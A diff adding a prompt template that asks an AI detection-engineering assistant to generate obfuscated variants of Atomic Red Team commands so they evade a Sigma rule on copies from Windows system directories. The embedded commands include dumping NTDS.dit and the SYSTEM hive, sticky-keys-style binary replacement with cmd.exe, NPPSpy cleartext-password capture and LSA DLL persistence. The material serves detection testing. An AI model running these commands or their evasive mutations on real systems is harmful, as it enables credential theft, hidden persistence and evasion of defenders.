@@ -1,0 +1,136 @@
+You are a SIEM detection engineering assistant with expert knowledge of Sigma rules, Windows process creation logs, and command-line parsing.
+
+Your task is to assess whether the given Sigma rule may be bypassed by safe command-line obfuscation/mutation techniques
+
+Allowed command-line mutation techniques:
+
+1. Insertion: Insert characters that the shell/application may ignore or still parse correctly, such as quotes, spaces, or escape characters.
+2. Substitution: Replace syntax with equivalent syntax, such as short option to long option, `/flag` to `-flag`, or equivalent argument forms.
+3. Omission: Remove optional or unnecessary elements while preserving the intended test behavior, such as omitting `.exe` or optional flags.
+4. Reordering: Reorder arguments if the target program accepts different argument order without changing behavior.
+5. Recoding / Encoding: Represent the same value differently, such as environment variables, path normalization, alternative IP notation, or equivalent string representation.
+6. Other  techniques
+
+Analysis procedure:
+
+1. Parse the Sigma rule and identify the fields and exact search terms that are likely to trigger detection.
+2. Compare the rule logic with the true positive test command.
+3. Identify which tokens in the true positive command are semantically important and which tokens are only syntactic indicators used by the rule.
+4. Generate only command-line variants that are safe, simulated, and likely to preserve the intended test behavior.
+5. For each generated command, explain:
+
+   * which mutation technique was used;
+   * which rule condition it is intended to avoid;
+   * why the high-level behavior is expected to remain equivalent in a test environment;
+   * any assumption or uncertainty.
+
+Input:
+
+Sigma Rule:
+
+```yaml
+title: Suspicious Copy From or To System Directory
+id: fff9d2b7-e11c-4a69-93d3-40ef66189767
+related:
+    - id: 855bc8b5-2ae8-402e-a9ed-b889e6df1900
+      type: derived
+status: test
+description: |
+    Detects a suspicious copy operation that tries to copy a program from system (System32, SysWOW64, WinSxS) directories to another on disk.
+    Often used to move LOLBINs such as 'certutil' or 'desktopimgdownldr' to a different location with a different name in order to bypass detections based on locations.
+references:
+    - https://www.hybrid-analysis.com/sample/8da5b75b6380a41eee3a399c43dfe0d99eeefaa1fd21027a07b1ecaa4cd96fdd?environmentId=120
+    - https://web.archive.org/web/20180331144337/https://www.fireeye.com/blog/threat-research/2018/03/sanny-malware-delivery-method-updated-in-recently-observed-attacks.html
+    - https://thedfirreport.com/2023/08/28/html-smuggling-leads-to-domain-wide-ransomware/
+author: Florian Roth (Nextron Systems), Markus Neis, Tim Shelton (HAWK.IO), Nasreddine Bencherchali (Nextron Systems)
+date: 2020-07-03
+modified: 2023-08-29
+tags:
+    - attack.defense-evasion
+    - attack.t1036.003
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_cmd:
+        Image|endswith: '\cmd.exe'
+        CommandLine|contains: 'copy '
+    selection_pwsh:
+        Image|endswith:
+            - '\powershell.exe'
+            - '\pwsh.exe'
+        CommandLine|contains:
+            - 'copy-item'
+            - ' copy '
+            - 'cpi '
+            - ' cp '
+    selection_other:
+        - Image|endswith:
+              - '\robocopy.exe'
+              - '\xcopy.exe'
+        - OriginalFileName:
+              - 'robocopy.exe'
+              - 'XCOPY.EXE'
+    target:
+        CommandLine|contains:
+            - '\System32'
+            - '\SysWOW64'
+            - '\WinSxS'
+    condition: 1 of selection_* and target
+falsepositives:
+    - Depend on scripts and administrative tools used in the monitored environment (For example an admin scripts like https://www.itexperience.net/sccm-batch-files-and-32-bits-processes-on-64-bits-os/)
+    - When cmd.exe and xcopy.exe are called directly #  C:\Windows\System32\cmd.exe /c copy file1 file2
+    - When the command contains the keywords but not in the correct order
+level: medium
+```
+
+True positive test command:
+
+```text
+"cmd.exe" /c copy "C:\AtomicRedTeam\atomics\T1543.003\bin\w64time.dll" %%systemroot%%\system32\ & sc create W64Time binPath= "c:\Windows\System32\svchost.exe -k TimeService" type= share start=auto & sc config W64Time DisplayName= "Windows 64 Time" & sc description W64Time "Maintain date and time synch on all clients and services in the network" & reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Svchost" /v TimeService /t REG_MULTI_SZ /d "W64Time" /f & reg add "HKLM\SYSTEM\CurrentControlSet\Services\W64Time\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "%%systemroot%%\system32\w64time.dll" /f & sc start W64Time
+"cmd.exe" /c copy "C:\Windows\System32\calc.exe" %%temp%%\T1036.007_masquerading.docx.exe /Y & copy "C:\Windows\System32\calc.exe" %%temp%%\T1036.007_masquerading.pdf.exe /Y & copy "C:\Windows\System32\calc.exe" %%temp%%\T1036.007_masquerading.ps1.exe /Y & copy "C:\AtomicRedTeam\atomics\T1036.007\src\T1036.007_masquerading.vbs" %%temp%%\T1036.007_masquerading.xls.vbs /Y & copy "C:\AtomicRedTeam\atomics\T1036.007\src\T1036.007_masquerading.vbs" %%temp%%\T1036.007_masquerading.xlsx.vbs /Y & copy "C:\AtomicRedTeam\atomics\T1036.007\src\T1036.007_masquerading.vbs" %%temp%%\T1036.007_masquerading.png.vbs /Y & copy "C:\AtomicRedTeam\atomics\T1036.007\src\T1036.007_masquerading.ps1" %%temp%%\T1036.007_masquerading.doc.ps1 /Y & copy "C:\AtomicRedTeam\atomics\T1036.007\src\T1036.007_masquerading.ps1" %%temp%%\T1036.007_masquerading.pdf.ps1 /Y & copy "C:\AtomicRedTeam\atomics\T1036.007\src\T1036.007_masquerading.ps1" %%temp%%\T1036.007_masquerading.rtf.ps1 /Y & %%temp%%\T1036.007_masquerading.docx.exe & %%temp%%\T1036.007_masquerading.pdf.exe & %%temp%%\T1036.007_masquerading.ps1.exe & %%temp%%\T1036.007_masquerading.xls.vbs & %%temp%%\T1036.007_masquerading.xlsx.vbs & %%temp%%\T1036.007_masquerading.png.vbs & C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %%temp%%\T1036.007_masquerading.doc.ps1 & C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %%temp%%\T1036.007_masquerading.pdf.ps1 & C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %%temp%%\T1036.007_masquerading.rtf.ps1
+"cmd.exe" /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Windows\Temp\ntds.dit & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Windows\Temp\VSC_SYSTEM_HIVE & reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM_HIVE
+"cmd.exe" /c copy %%SystemRoot%%\System32\cmd.exe %%SystemRoot%%\Temp\lsass.exe & %%SystemRoot%%\Temp\lsass.exe /B
+"cmd.exe" /c copy %%SystemRoot%%\System32\cscript.exe %%APPDATA%%\notepad.exe /Y & cmd.exe /c %%APPDATA%%\notepad.exe /B
+"cmd.exe" /c copy %%SystemRoot%%\System32\wscript.exe %%APPDATA%%\svchost.exe /Y & cmd.exe /c %%APPDATA%%\svchost.exe "C:\AtomicRedTeam\atomics\..\ExternalPayloads\T1036.003\src\T1036.003_masquerading.vbs"
+"cmd.exe" /c copy %%windir%%\System32\amsi.dll %%APPDATA%%\amsi.dll & ren %%APPDATA%%\amsi.dll ualapi.dll & copy %%APPDATA%%\ualapi.dll %%windir%%\System32\ualapi.dll & sc config Spooler start=auto
+"cmd.exe" /c copy %%windir%%\System32\amsi.dll %%APPDATA%%\amsi.dll & ren %%APPDATA%%\amsi.dll WinAppXRT.dll & copy %%APPDATA%%\WinAppXRT.dll %%windir%%\System32\WinAppXRT.dll & reg add "HKEY_CURRENT_USER\Environment" /v APPX_PROCESS /t REG_EXPAND_SZ /d "1" /f
+"cmd.exe" /c copy %%windir%%\System32\calc.exe not_an_scr.scr & rundll32.exe desk.cpl,InstallScreenSaver not_an_scr.scr
+"cmd.exe" /c copy %%windir%%\system32\certutil.exe %%temp%%\tcm.tmp & %%temp%%\tcm.tmp -encode C:\Windows\System32\calc.exe %%temp%%\T1140_calc2.txt & %%temp%%\tcm.tmp -decode %%temp%%\T1140_calc2.txt %%temp%%\T1140_calc2_decoded.exe
+"cmd.exe" /c copy %%windir%%\System32\windowspowershell\v1.0\powershell.exe %%APPDATA%%\taskhostw.exe /Y & cmd.exe /K %%APPDATA%%\taskhostw.exe
+"cmd.exe" /c copy %%windir%%\System32\windowspowershell\v1.0\powershell.exe %%APPDATA%%\updater.exe & copy %%windir%%\System32\amsi.dll %%APPDATA%%\amsi.dll & %%APPDATA%%\updater.exe -Command exit
+"cmd.exe" /c copy C:\Windows\System32\cmd.exe C:\lsm.exe & C:\lsm.exe /c echo T1036.003 > C:\T1036.003.txt
+"cmd.exe" /c copy C:\Windows\System32\cmd.exe C:\svchost.exe & C:\svchost.exe /c echo T1105 > \\localhost\c$\T1105.txt
+"cmd.exe" /c copy c:\windows\system32\ie4uinit.exe %%TEMP%%\ie4uinit.exe & copy "C:\AtomicRedTeam\atomics\T1218\src\ieuinit.inf" %%TEMP%%\ieuinit.inf & %%TEMP%%\ie4uinit.exe -BaseSettings
+"cmd.exe" /c IF NOT EXIST %%windir%%\System32\osk.exe.bak (copy %%windir%%\System32\osk.exe %%windir%%\System32\osk.exe.bak) ELSE ( pushd ) & takeown /F %%windir%%\System32\osk.exe /A & icacls %%windir%%\System32\osk.exe /grant Administrators:F /t & del %%windir%%\System32\osk.exe & mklink %%windir%%\System32\osk.exe %%windir%%\System32\cmd.exe
+"cmd.exe" /c IF NOT EXIST C:\Windows\System32\AtBroker_backup.exe (copy C:\Windows\System32\AtBroker.exe C:\Windows\System32\AtBroker_backup.exe) ELSE ( pushd ) & takeown /F C:\Windows\System32\AtBroker.exe /A & icacls C:\Windows\System32\AtBroker.exe /grant Administrators:F /t & copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\AtBroker.exe
+"cmd.exe" /c IF NOT EXIST C:\Windows\System32\DisplaySwitch_backup.exe (copy C:\Windows\System32\DisplaySwitch.exe C:\Windows\System32\DisplaySwitch_backup.exe) ELSE ( pushd ) & takeown /F C:\Windows\System32\DisplaySwitch.exe /A & icacls C:\Windows\System32\DisplaySwitch.exe /grant Administrators:F /t & copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\DisplaySwitch.exe
+"cmd.exe" /c IF NOT EXIST C:\Windows\System32\Magnify_backup.exe (copy C:\Windows\System32\Magnify.exe C:\Windows\System32\Magnify_backup.exe) ELSE ( pushd ) & takeown /F C:\Windows\System32\Magnify.exe /A & icacls C:\Windows\System32\Magnify.exe /grant Administrators:F /t & copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\Magnify.exe
+"cmd.exe" /c IF NOT EXIST C:\Windows\System32\Narrator_backup.exe (copy C:\Windows\System32\Narrator.exe C:\Windows\System32\Narrator_backup.exe) ELSE ( pushd ) & takeown /F C:\Windows\System32\Narrator.exe /A & icacls C:\Windows\System32\Narrator.exe /grant Administrators:F /t & copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\Narrator.exe
+"cmd.exe" /c IF NOT EXIST C:\Windows\System32\sethc_backup.exe (copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc_backup.exe) ELSE ( pushd ) & takeown /F C:\Windows\System32\sethc.exe /A & icacls C:\Windows\System32\sethc.exe /grant Administrators:F /t & copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
+"cmd.exe" /c IF NOT EXIST C:\Windows\System32\utilman_backup.exe (copy C:\Windows\System32\utilman.exe C:\Windows\System32\utilman_backup.exe) ELSE ( pushd ) & takeown /F C:\Windows\System32\utilman.exe /A & icacls C:\Windows\System32\utilman.exe /grant Administrators:F /t & copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
+"cmd.exe" /c mkdir "\\?\C:\Windows \System32\" & copy "C:\Windows\System32\cmd.exe" "\\?\C:\Windows \System32\mmc.exe" & mklink c:\testbypass.exe "\\?\C:\Windows \System32\mmc.exe"
+"cmd.exe" /c reg export "HKEY_CURRENT_USER\Control Panel\Desktop" %%userprofile%%\backup.reg & copy C:\Windows\System32\cmd.exe "%%SystemRoot%%\System32\evilscreensaver.scr" & reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveActive /t REG_SZ /d 1 /f & reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveTimeout /t REG_SZ /d 60 /f & reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f & reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "%%SystemRoot%%\System32\evilscreensaver.scr" /f & if 0 NEQ 0 shutdown /r /t 0
+"powershell.exe" & {# Copy and rename cmd.exe to VEDetector.exe Copy-Item -Path \""$env:SystemRoot\System32\cmd.exe\"" -Destination \""$env:TEMP\VEDetector.exe\"" -Force # Create registry run key for persistence New-ItemProperty -Path \""HKLM:\Software\Microsoft\Windows\CurrentVersion\Run\"" -Name \""VEDetector\"" -Value \""$env:TEMP\VEDetector.exe\"" -PropertyType String -Force # Start the renamed process Start-Process -FilePath \""$env:TEMP\VEDetector.exe\"" Start-Sleep -Seconds 5}
+"powershell.exe" & {$termsrvDll = \""C:\Windows\System32\termsrv.dll\"" $ACL = Get-Acl $termsrvDll $permission = \""Administrators\"",\""FullControl\"",\""Allow\"" $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule $permission $ACL.SetAccessRule($accessRule) Set-Acl -Path $termsrvDll -AclObject $ACL Copy-Item -Path \""C:\Windows\System32\termsrv.dll\"" -Destination \""C:\Windows\System32\termsrv_backup.dll\"" -ErrorAction Ignore Add-Content -Path \""C:\Windows\System32\termsrv.dll\"" -Value \""`n\"" -NoNewline -ErrorAction Ignore Move-Item -Path \""C:\Windows\System32\termsrv_backup.dll\"" -Destination \""C:\Windows\System32\termsrv.dll\"" -Force -ErrorAction Ignore}
+"powershell.exe" & {$termsrvDll = \""C:\Windows\System32\termsrv.dll\"" $ACL = Get-Acl $termsrvDll $permission = \""Administrators\"",\""FullControl\"",\""Allow\"" $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule $permission $ACL.SetAccessRule($accessRule) Set-Acl -Path $termsrvDll -AclObject $ACL Copy-Item -Path $termsrvDll -Destination \""$HOME\AtomicTest.dll\"" $newServiceDll = \""$HOME\AtomicTest.dll\"" $registryPath = \""HKLM:\System\CurrentControlSet\services\TermService\Parameters\"" # Check if the registry key exists if (Test-Path -Path $registryPath) { # Modify the ServiceDll value in the registry Set-ItemProperty -Path $registryPath -Name \""ServiceDll\"" -Value $newServiceDll Write-Host \""ServiceDll value in the registry has been updated to: $newServiceDll\"" } else { Write-Host \""Registry key not found. Make sure the 'TermService\Parameters' key exists.\"" }}
+"powershell.exe" & {Copy-Item -Path C:\AtomicRedTeam\atomics\T1546\src\ErrorHandler.cmd -Destination C:\Windows\Setup\Scripts\ErrorHandler.cmd C:\windows\System32\oobe\Setup}
+"powershell.exe" & {copy-item \""$env:windir\System32\cmd.exe\"" -destination \""$env:allusersprofile\cmd.exe\"" start-process \""$env:allusersprofile\cmd.exe\"" sleep -s 5 stop-process -name \""cmd\"" | out-null}
+"powershell.exe" & {Copy-Item \""C:\AtomicRedTeam\atomics\..\ExternalPayloads\NPPSPY.dll\"" -Destination \""C:\Windows\System32\"" $path = Get-ItemProperty -Path \""HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order\"" -Name PROVIDERORDER $UpdatedValue = $Path.PROVIDERORDER + \"",NPPSpy\"" Set-ItemProperty -Path $Path.PSPath -Name \""PROVIDERORDER\"" -Value $UpdatedValue $rv = New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy -ErrorAction Ignore $rv = New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -ErrorAction Ignore $rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name \""Class\"" -Value 2 -ErrorAction Ignore $rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name \""Name\"" -Value NPPSpy -ErrorAction Ignore $rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name \""ProviderPath\"" -PropertyType ExpandString -Value \""%%SystemRoot%%\System32\NPPSPY.dll\"" -ErrorAction Ignore echo \""[!] Please, logout and log back in. Cleartext password for this account is going to be located in C:\NPPSpy.txt\""}
+"powershell.exe" & {Copy-Item \""C:\AtomicRedTeam\atomics\T1547.002\bin\package.dll\"" C:\Windows\System32\ reg add \""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\"" /v \""Authentication Packages\"" /t REG_MULTI_SZ /d \""msv1_0\0package.dll\"" /f}
+"powershell.exe" & {if (-not (Test-Path C:\test)) { New-Item -Path C:\test -ItemType Directory } else { Write-Host \""Directory C:\test already exists.\"" } Copy-Item -Path \""C:\windows\system32\customshellhost.exe\"" -Destination \""C:\test\customshellhost.exe\"" -Force Copy-Item -Path \""C:\windows\system32\calc.exe\"" -Destination \""C:\test\explorer.exe\"" -Force C:\test\customshellhost.exe}
+"powershell.exe" & {New-Item -ItemType Directory -path \""$env:TMP\atomictest\\"" Copy-Item -path \""C:\Windows\System32\calc.exe\"" -destination \""$env:TMP\atomictest\\"" Set-ItemProperty -Path \""HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders\"" -Name \""Startup\"" -Value \""$env:TMP\atomictest\\""}
+"powershell.exe" & {New-Item -ItemType Directory -path \""$env:TMP\atomictest\\"" Copy-Item -path \""C:\Windows\System32\calc.exe\"" -destination \""$env:TMP\atomictest\\"" Set-ItemProperty -Path \""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders\"" -Name \""Common Startup\"" -Value \""$env:TMP\atomictest\\""}
+"powershell.exe" & {reg.exe export HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ \""C:\AtomicRedTeam\atomics\T1556.002\lsa_backup.reg\"" $passwordFilterName = (Copy-Item \""C:\AtomicRedTeam\atomics\T1556.002\bin\AtomicRedTeamPWFilter.dll\"" -Destination \""C:\Windows\System32\"" -PassThru).basename $lsaKey = Get-Item \""HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\\"" $AuthenticationPackagesValues = $lsaKey.GetValue(\""Authentication Packages\"") $AuthenticationPackagesValues += $passwordFilterName Set-ItemProperty \""HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\\"" \""Authentication Packages\"" $AuthenticationPackagesValues}
+"powershell.exe" & {reg.exe export HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ \""C:\AtomicRedTeam\atomics\T1556.002\lsa_backup.reg\"" $passwordFilterName = (Copy-Item \""C:\AtomicRedTeam\atomics\T1556.002\bin\AtomicRedTeamPWFilter.dll\"" -Destination \""C:\Windows\System32\"" -PassThru).basename $lsaKey = Get-Item \""HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\\"" $notificationPackagesValues = $lsaKey.GetValue(\""Notification Packages\"") $notificationPackagesValues += $passwordFilterName Set-ItemProperty \""HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\\"" \""Notification Packages\"" $notificationPackagesValues}
+```
+
+Output JSON schema:
+[
+{
+"output": "A generated simulated command line. Use an empty string only when no safe command can be generated.",
+"explanation": "A short explanation mentioning the mutation technique and the avoided rule condition." "
+}
+]
+
+Return JSON only.
